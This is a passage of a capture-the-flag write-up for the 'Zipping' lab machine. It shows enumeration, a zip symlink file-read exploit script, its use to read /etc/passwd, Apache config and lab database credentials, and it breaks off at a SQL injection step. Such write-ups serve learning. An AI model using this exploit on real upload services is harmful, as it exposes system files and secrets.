+        <h2 id="overview" class="relative group">Overview <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#overview" aria-label="Anchor">#</a></span></h2><hr>
+<blockquote>
+<p>Zipping is a medium-difficulty Linux box hosting a PHP web application with a vulnerable file upload function. This function is susceptible to a file read exploit involving zip archives. By exploiting this flaw, I was able to obtain the application&rsquo;s source code, revealing a SQL injection vulnerability. I leveraged this vulnerability to write a webshell on the system. Additionally, I discovered that the user <code>rektsu</code> has sudo privileges over a binary, and misconfigurations in shared library objects can be exploited to gain root privileges.</p>
+</blockquote>
+<hr>
+<h2 id="enumeration" class="relative group">Enumeration <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#enumeration" aria-label="Anchor">#</a></span></h2><hr>
+<h3 id="open-ports" class="relative group">Open Ports <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#open-ports" aria-label="Anchor">#</a></span></h3><p>I found two open ports using nmap:</p>
+<ul>
+<li>port 22 → OpenSSH</li>
+<li>port 80 → Apache Web server</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Nmap 7.94 scan initiated Fri Sep  1 17:12:31 2023 as: nmap -p22,80 -sV -sC -T4 -Pn -oA nmap/10.129.66.225 10.129.66.225</span>
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.129.66.225
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.061s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu7.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 9d:6e:ec:02:2d:0f:6a:38:60:c6:aa:ac:1e:e0:c2:84 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> eb:95:11:c7:a6:fa:ad:74🆎a2:c5:f6:a4:02:18:41 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.54 <span class="o">((</span>Ubuntu<span class="o">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Zipping <span class="p">|</span> Watch store
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.54 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><h3 id="port-80---http" class="relative group">port 80 - HTTP <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#port-80---http" aria-label="Anchor">#</a></span></h3><p>The headers give limited information, revealing only the Apache version in use, v2.4.54.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; http -ph 10.129.66.225
+</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">200</span> OK
+</span></span><span class="line"><span class="cl">Connection: Keep-Alive
+</span></span><span class="line"><span class="cl">Content-Encoding: gzip
+</span></span><span class="line"><span class="cl">Content-Length: <span class="m">4094</span>
+</span></span><span class="line"><span class="cl">Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
+</span></span><span class="line"><span class="cl">Date: Fri, <span class="m">01</span> Sep <span class="m">2023</span> 11:53:53 GMT
+</span></span><span class="line"><span class="cl">Keep-Alive: <span class="nv">timeout</span><span class="o">=</span>5, <span class="nv">max</span><span class="o">=</span><span class="m">100</span>
+</span></span><span class="line"><span class="cl">Server: Apache/2.4.54 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Vary: Accept-Encoding
+</span></span></code></pre></div><p>The website appears to be an eCommerce platform specializing in watches. The presence of <em>shop</em> and <em>work-with-us</em> links on the index page hint at functionalities beyond static information. Additionally, <code>.php</code> extensions suggest the backend relies on PHP.</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="./images/index-page.png" alt="index-page" class="mx-auto my-0 rounded-md" /><figcaption class="text-center">Index Page</figcaption>
+</figure>
+</p>
+<p>Probing further, I examined <code>shop/index.php</code>. It showcases several products that can be added to the cart. However, attempts to place an order appears inconsequential.</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="./images/shop-page.png" alt="shop-page" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>Clicking the <code>Work with Us</code> button redirects to <code>/upload.php</code>. The page has an intriguing functionality: the ability to upload zip files. The only peculiar condition is that the uploaded zip file must contain a PDF document within its structure.</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="./images/work-with-us-page.png" alt="work-with-us-page" class="mx-auto my-0 rounded-md" /><figcaption class="text-center">Work with us page</figcaption>
+</figure>
+</p>
+<h3 id="directory-bruteforcing" class="relative group">Directory bruteforcing <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#directory-bruteforcing" aria-label="Anchor">#</a></span></h3><p>Before investigating the upload functionality, I opted to fuzz for hidden files and directories with ffuf. Unfortunately, the scan doesn&rsquo;t return additional results beyond what I had already discovered.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.129.66.225/FUZZ -o ffuf_zipping.md -of md -t <span class="m">100</span>
+</span></span><span class="line"><span class="cl">...snip...
+</span></span><span class="line"><span class="cl">...snip...
+</span></span><span class="line"><span class="cl">.hta                    <span class="o">[</span>Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 63ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">.htpasswd               <span class="o">[</span>Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 63ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">.htaccess               <span class="o">[</span>Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 63ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">assets                  <span class="o">[</span>Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 62ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">index.php               <span class="o">[</span>Status: 200, Size: 16738, Words: 5717, Lines: 318, Duration: 66ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">server-status           <span class="o">[</span>Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 59ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">shop                    <span class="o">[</span>Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 56ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">uploads                 <span class="o">[</span>Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 61ms<span class="o">]</span>
+</span></span></code></pre></div><hr>
+<h2 id="initial-foothold" class="relative group">Initial Foothold <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#initial-foothold" aria-label="Anchor">#</a></span></h2><hr>
+<h3 id="zip-symlink-file-read-vulnerability" class="relative group">Zip symlink file-read vulnerability <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#zip-symlink-file-read-vulnerability" aria-label="Anchor">#</a></span></h3><p>Upon successful upload of a valid zip file that met the specified condition, the system automatically extracts the contents of the archive. This part interests me, as it potentially introduces a compelling point of vulnerability. The prospect of a staff member subsequently interacting with the extracted PDF makes it even more interesting. The page also returns a link to view to extracted PDF file.</p>
+<p>The very first vulnerability that comes to mind when considering automatic archive extraction is the <a href="https://book.hacktricks.xyz/pentesting-web/file-upload#zip-tar-file-automatically-decompressed-upload" target="_blank" rel="noreferrer">zip symlink attack</a>. In essence, this involves adding a symlink to another file on the system within the archive. By accessing the decompressed file, one can potentially view the contents of the linked file.</p>
+<p>Given that the uploaded zip requires a PDF file, creating a soft symlink from <code>/etc/hostname</code> to <code>file.pdf</code> suing <code>ln</code>. Moreover, during the compression of the file, the preservation of the symlink can be ensured by using the <code>-y</code> option.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; ln -s /etc/hostname file.pdf
+</span></span><span class="line"><span class="cl">&gt; zip -y poc.zip file.pdf
+</span></span><span class="line"><span class="cl">  adding: file.pdf <span class="o">(</span>stored 0%<span class="o">)</span>
+</span></span></code></pre></div><p>The newly crafted archive can be successfully uploaded, and as a result it returns a link to view the decompressed PDF file.</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="./images/Upload-poc.png" alt="Upload-poc" class="mx-auto my-0 rounded-md" /><figcaption class="text-center">Zip symlink exploit PoC</figcaption>
+</figure>
+</p>
+<p>As anticipated, because <code>file.pdf</code> points to <code>/etc/hostname</code>, querying the file using the provided link reveals the contents of <code>/etc/hostname</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; http -pb http://10.129.66.225/uploads/6d34d4685c1618ff320f6679d158c477/file.pdf
+</span></span><span class="line"><span class="cl">zipping
+</span></span></code></pre></div><p>To streamline the process, I wrote a Python script that automates the creation of a symlink, then archiving and uploading, and finally viewing the decompressed file.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">subprocess</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">urllib3</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">urllib3</span><span class="o">.</span><span class="n">disable_warnings</span><span class="p">(</span><span class="n">urllib3</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">InsecureRequestWarning</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">filePath</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">username</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">password</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://10.129.66.225/&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;http&#34;</span><span class="p">:</span> <span class="s2">&#34;http://127.0.0.1:8080&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># files = {&#39;file&#39;: (&#39;xxe.xml&#39;, payload, &#39;text/xml&#39;)}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">fileName</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">basename</span><span class="p">(</span><span class="n">filePath</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">symlink_command</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;ln -s </span><span class="si">{</span><span class="n">filePath</span><span class="si">}</span><span class="s2"> symlink.pdf&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">symlink_process</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">(</span><span class="n">symlink_command</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">symlink_process</span><span class="o">.</span><span class="n">wait</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">symlink_process</span><span class="o">.</span><span class="n">returncode</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Error symlinking: </span><span class="si">{</span><span class="n">symlink_process</span><span class="o">.</span><span class="n">returncode</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">exit</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Symlink created.&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">zip_command</span> <span class="o">=</span> <span class="s2">&#34;zip -y exploit.zip symlink.pdf&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">zip_process</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">(</span><span class="n">zip_command</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">zip_process</span><span class="o">.</span><span class="n">wait</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">zip_process</span><span class="o">.</span><span class="n">returncode</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Error zipping: </span><span class="si">{</span><span class="n">zip_process</span><span class="o">.</span><span class="n">returncode</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">exit</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] File successfully zipped.&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;exploit.zip&#34;</span><span class="p">,</span> <span class="s2">&#34;rb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">zip_content</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">files</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;zipFile&#34;</span><span class="p">:</span> <span class="p">(</span><span class="s2">&#34;exploit.zip&#34;</span><span class="p">,</span> <span class="n">zip_content</span><span class="p">,</span> <span class="s2">&#34;application/zip&#34;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;submit&#34;</span><span class="p">:</span> <span class="p">(</span><span class="kc">None</span><span class="p">,</span> <span class="s2">&#34;Submit&#34;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># print(files)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">response</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="n">url</span><span class="o">=</span><span class="n">url</span> <span class="o">+</span> <span class="s2">&#34;upload.php&#34;</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">pattern</span> <span class="o">=</span> <span class="sa">r</span><span class="s2">&#34;uploads/[0-9a-fA-F]</span><span class="si">{32}</span><span class="s2">/symlink\.pdf&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="ow">not</span> <span class="k">match</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;File not uploaded&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">uploaded_path</span> <span class="o">=</span> <span class="k">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;View file @ </span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s2">/</span><span class="si">{</span><span class="n">uploaded_path</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">response</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span> <span class="o">+</span> <span class="n">uploaded_path</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;File content:</span><span class="se">\n</span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">fileName</span><span class="p">,</span> <span class="s2">&#34;a&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&#34;rm -rf symlink.pdf exploit.zip&#34;</span><span class="p">)</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; python zipSymlink.py /etc/hostname
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Symlink created.
+</span></span><span class="line"><span class="cl">  adding: symlink.pdf <span class="o">(</span>stored 0%<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> File successfully zipped.
+</span></span><span class="line"><span class="cl">View file @ http://10.129.66.225//uploads/05101da7a883e7887506fca8c88787ca/symlink.pdf
+</span></span><span class="line"><span class="cl">File content:
+</span></span><span class="line"><span class="cl">zipping
+</span></span></code></pre></div><p>I was able to Identify a user named <code>rektsu</code> based on the information retrieved from the <code>/etc/passwd</code> file.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; python zipSymlink.py /etc/passwd <span class="p">|</span> grep sh$
+</span></span><span class="line"><span class="cl">root❌0:0:root:/root:/bin/bash
+</span></span><span class="line"><span class="cl">rektsu❌1001:1001::/home/rektsu:/bin/bash
+</span></span></code></pre></div><p>As per the Apache configuration file, the root directory for the website is located at <code>/var/www/html</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; python zipSymlink.py /etc/apache2/sites-available/000-default.conf
+</span></span><span class="line"><span class="cl">...snip...
+</span></span><span class="line"><span class="cl">...snip...
+</span></span><span class="line"><span class="cl">    ServerAdmin webmaster@localhost
+</span></span><span class="line"><span class="cl">    DocumentRoot /var/www/html
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    &lt;Directory /var/www/html/uploads&gt;
+</span></span><span class="line"><span class="cl">        Options -Indexes
+</span></span><span class="line"><span class="cl">    &lt;/Directory&gt;
+</span></span><span class="line"><span class="cl">...snip...
+</span></span></code></pre></div><p>By using the document root, I accessed the source code of the page at <code>shop/index.php</code> (<code>/var/www/html/shop/index.php</code>). The code includes PHP files, with the limitation that it appends a <code>.php</code> to the value of the page parameter, allowing only the inclusion of PHP files. Despite not knowing the PHP version, my initial attempt to use a null byte (<code>index.php?page=/etc/hostname%00</code>) proved unsuccessful, indicating a PHP version likely greater than 8.</p>
+<p><em>shop/index.php</em></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">session_start</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// Include functions and connect to the database using PDO MySQL
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">include</span> <span class="s1">&#39;functions.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$pdo</span> <span class="o">=</span> <span class="nx">pdo_connect_mysql</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// Page is set to home (home.php) by default, so when the visitor visits, that will be the page they see.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$page</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;page&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">file_exists</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;page&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;.php&#39;</span><span class="p">)</span> <span class="o">?</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;page&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="s1">&#39;home&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// Include and show the requested page
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">include</span> <span class="nv">$page</span> <span class="o">.</span> <span class="s1">&#39;.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>The <code>index.php</code> file includes a <code>function.php</code> file, presumably situated in the same directory. In the <code>shop/functions.php</code> file, I found credentials for the MySQL database: <code>root:MySQL_P@ssw0rd!</code>. It also references a <code>products.php</code> file.</p>
+<p><em>shop/functions.php</em></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">pdo_connect_mysql</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// Update the details below with your MySQL details
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$DATABASE_HOST</span> <span class="o">=</span> <span class="s1">&#39;localhost&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$DATABASE_USER</span> <span class="o">=</span> <span class="s1">&#39;root&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$DATABASE_PASS</span> <span class="o">=</span> <span class="s1">&#39;MySQL_P@ssw0rd!&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$DATABASE_NAME</span> <span class="o">=</span> <span class="s1">&#39;zipping&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">new</span> <span class="nx">PDO</span><span class="p">(</span><span class="s1">&#39;mysql:host=&#39;</span> <span class="o">.</span> <span class="nv">$DATABASE_HOST</span> <span class="o">.</span> <span class="s1">&#39;;dbname=&#39;</span> <span class="o">.</span> <span class="nv">$DATABASE_NAME</span> <span class="o">.</span> <span class="s1">&#39;;charset=utf8&#39;</span><span class="p">,</span> <span class="nv">$DATABASE_USER</span><span class="p">,</span> <span class="nv">$DATABASE_PASS</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="o">---</span><span class="nx">snip</span><span class="o">---</span>
+</span></span><span class="line"><span class="cl">                    <span class="o">&lt;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="s2">&#34;index.php&#34;</span><span class="o">&gt;</span><span class="nx">Home</span><span class="o">&lt;/</span><span class="nx">a</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">                    <span class="o">&lt;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="s2">&#34;index.php?page=products&#34;</span><span class="o">&gt;</span><span class="nx">Products</span><span class="o">&lt;/</span><span class="nx">a</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">---</span><span class="nx">snip</span><span class="o">---</span>
+</span></span></code></pre></div><h3 id="writing-a-webshell-using-sqli" class="relative group">Writing a webshell using SQLi <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#writing-a-webshell-using-sqli" aria-label="Anchor">#</a></span></h3><p>The source for <code>products.php</code> is much more interesting. It directly incorporates the <code>id</code> parameter from the GET parameters into a SQL query.</p>
+<p><em>products.php</em></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// Check to make sure the id parameter is specified in the URL
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$id</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// Filtering user input for letters or special characters
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/^.*[A-Za-z!#$%^&amp;*()\-_=+{}\[\]</span><span class="se">\\</span><span class="s2">|;:&#39;</span><span class="se">\&#34;</span><span class="s2">,.&lt;&gt;\/?]|[^0-9]$/&#34;</span><span class="p">,</span> <span class="nv">$id</span><span class="p">,</span> <span class="nv">$match</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Location: index.php&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// Prepare statement and execute, but does not prevent SQL injection
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">&#34;SELECT * FROM products WHERE id = &#39;</span><span class="si">$id</span><span class="s2">&#39;&#34;</span><span class="p">);</span>
